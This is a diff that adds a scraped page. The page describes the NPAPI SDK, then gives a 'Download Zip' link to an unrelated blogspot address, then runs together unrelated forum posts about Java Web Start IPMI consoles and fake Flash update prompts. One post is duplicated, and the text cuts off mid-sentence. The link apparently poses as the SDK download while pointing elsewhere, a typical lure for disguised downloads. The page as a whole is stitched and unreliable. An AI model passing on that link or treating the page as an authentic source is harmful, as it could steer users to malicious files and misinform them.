@@ -1,0 +1,50 @@
+The NPAPI SDK includes recommended NPAPI header files plus sample plugins and utility code. The header files are used to develop NPAPI plugins and browsers. Browser vendors typically have a copy of these headers in their source tree and we are working on standardizing them (the major differences are source-compatibility issues).
+ 
+**Download Zip 🔗 [https://zoohogonka.blogspot.com/?file=2A0SLo](https://zoohogonka.blogspot.com/?file=2A0SLo)**
+
+
+ 
+The plugin-futures mailing list is where we discuss the evolution of NPAPI. This mailing list is for discussing the evolution of the API itself, primarily by plugin and browser developers. It is not a plugin developer tech-support list or a place for bug reports or complaints about specific plugins.
+ 
+You can subscribe here, all subscriptions require approval which can take minutes to days. As of March 2010, the list archives are available to the public. The plugin-futures mailing list uses this wiki for specifications.
+ 
+If you would like to submit an NPAPI proposal please document it in a page on this wiki and place a link below in the "NPAPI Specifications Under Consideration" section. Use the same formatting as other proposals. Then email the plugin-futures mailing list about your proposal, including a link to the wiki page.
+
+If you would like to modify an accepted proposal, please document the change as a new proposal and email plugin-futures (see above). Once the change is agreed upon, the proposal can be removed and the changes made to the accepted proposal. This does not apply to minor text updates and clarifications, but certainly to any functional changes.
+ 
+I finally got the console working. I was using JRE8 which just wouldn't play ball with the jnlp file. It kept giving me FailedDownloadException with a nested exception of SSLHandshakeException as the reason. I even added my IPMI IP address in the exception site list in the java config. No dice !!
+ 
+I finally downgraded my Java to JRE7u80. I still had to add my IPMI IP to the exception site list, but this time after warning me that running the program could be risky, it still ran it after I confirmed.
+ 
+UPDATE: Oracle has removed support for Web Start. I tried using icedtea-web which uses openjdk, but at least for me, the jnlp file never starts the console. I keep getting SSLHandshakeException or a Main Class not found exception. I tried downgrading java all the way from jdk11-jdk6 and I couldn't find the javaws binary in any of the packages. Since icedtea/openjdk doesn't work, my only option is to use ipmiview -- since both my boards are SuperMicro.
+ 
+I use firefox 51 plus java plugin. It is common rule to pack files as chroot environment or virtual machine or some container (docker, lxc, etc.) for use with older vendor hardware. All this java thing "write once run everywhere" is only true for some time.
+ 
+Received notice of Update to Adobe Flash. Downloaded in Edge and then had warning that this may harm PC. No issue when downloaded in Firefox and Norton then flags as safe. Microsoft help says Edge flags some third party apps with this warning if they meet certian (unspecified) criteria. MS says I can still decide to accept it, but how is a casual user (like myself) supposed to decide if safe or not safe when this alert appears? Also, can anyone say if downloading with one browser is "for the use and benefit of" the entire PC or is it browser specific? I couldn't get an answer from MS support as to this question.
+ 
+Thank you for the info. Although I appreciate your comments and suspect that you know much more about these things than I, I have pretty good reason to believe that this was a legitimate update. My reasons are as follows: (1) I recall this problem happening several weeks ago and I now see there was an update in June (that's probably about the time I first saw this. (2) The update notice resembled the ones I've typically received in the past with which I had no difficulty on my old PC with Window
+ 
+3. CRUCIAL most update notices are fake, they are attacks trying to get you to download malware. Sounds like Edge caught it (indeed, Edge is locked by Microsoft and download a REAL update is impossible!)
+ 
+Thank you for the info. Although I appreciate your comments and suspect that you know much more about these things than I, I have pretty good reason to believe that this was a legitimate update. My reasons are as follows: (1) I recall this problem happening several weeks ago and I now see there was an update in June (that's probably about the time I first saw this. (2) The update notice resembled the ones I've typically received in the past with which I had no difficulty on my old PC with Windows 7. (3) At the previous time, and again the other day (not knowing if this might be a new update), I used Firefox and my Norton program flagged it as safe each time. (4) Several full system scams including one just now have been negative except for low risk tracking cookies. (5) Microsoft agent - although I'm not always convinced that IT staff whose primary language is not English always understand the issue or explain things clearly - informs me that MS Edge is designed to flag third party downloads as possibly harmful (although the first time around the agent took "control" of my PC and allegedly "fixed" the problem. Another reason why I'm never sure that they fully understand the problem.) (6) I seem to recall that MS Edge flagged another valid download as possibly problematic although I don't recall what that was , I do seem to recall that I purposely sought out something to test what would happen and it was because it was happening with what I knew to be a safe item, I felt the "problem" was with Edge and that's why I called MS. (7) Although I don't know for certain, I suspect that even though I installed the June update using Firefox, it seems to be browser specific and because Edge is my default browser (for reasons I won't detail) I get the notice of new update - FYI, per another comment on the fake updates site, I got mine when I started the PC although sometimes my Edge opens automatically and not sure if it did each time I saw notice. Will look for that in future. (8) I just searched to see if browser specific and it seems to be =is+Adobe+Flash+browser+specific&form=ANSNB1&refig=b1369dd46d90457d8830... Site says "browser plug-in" and so, I suspect given negative scans and other factors, that I keep getting the notice because Adobe's auto update software is not "seeing" the update on my Edge browser (especially if it's appearing only when bowser open - I will try to confirm.
+ 
+Flash Player is a built-in component of IE and Edge on Windows 8 and higher. Installation and updates are handled by Microsoft via Windows Update. Similarly, Flash Player on Google Chrome is built into the browser and delivered via their auto-updater.
+ 
+If you also have Flash Player installed for Firefox (or other NPAPI browsers), then you would have needed to use our installers and auto-update mechanism, but you can always just open the Flash Player icon in the control planel and look at the Updates tab to check to see if you need an update, and install it.
+ 
+The reality is that the technical hurdles that need to be overcome in order for attackers to install malware on modern browsers and operating systems is very high. It's much easier to attack the human in the system and coax them into installing something malicious on their behalf.
+ 
+I just got a popup to update Flash after rebooting. It looked completely normal and I was about to do it. My mind was on something else and I accidentally clicked the Remind Me Later instead. It disappeared and did not return. So I have come to Adobe to get it, and I find several posts like these about it.
+I went to the download page and clicked to download the latest version of Flash. I did so, and the file name was exactly the same as one on my computer from July. It asked if I wanted to replace that file with the new one and I did. Sure enough, it was exactly the same.
+
+So I would advise that the update popup from Sept 13 is apparently not legit. And it was not on a webpage. I had just rebooted and had not even opened Chrome. It came from my computer.
+ 
+Flash Player installer files usually have same file name from one release to another. One difference would be the major version number included in the file name, however, Adobe hasn't incremented Flash Player's major version number in quite a while, so it's normally the same file name.
+ 
+I kind of have to question that. I have never had it pop up and ask if I wanted to replace the old file before. Either way, I won't ever do an update except off the webpage from now on...short time or not.
+ 
+Screenshots are always helpful when talking about particular messages or warnings, but I'm pretty sure that Edge tells you that anything you download that's executable (like an installer) is potentially harmful. It's the generic "caveat emptor" warning. Make sure you really, really trust the source of that executable. It's valid advice, and one of the reasons that we promote automatic updates so heavily.
+ 
+The meta issue here is that as an industry, we've made it pretty hard for malicious actors to actually install software without your express consent. It's a large part of why we plug automatic updates so hard. Humans are now the weak link in the chain. It's easier for an attacker to trick you into installing malware on their behalf than it is to install it themselves, plus it's generally better ROI.
+ 
+Along those lines, Google Chrome (on Mac/Win/Linux) and Microsoft Edge (and IE) on Win8+ both include Flash Player as a built-in component. The updates are distributed through the browser's built-in update mechanism. There's nothing to download or install. That doesn't stop bad actors (and poorly maintained websites) from recommending that you download and install updates from time to time, but where n
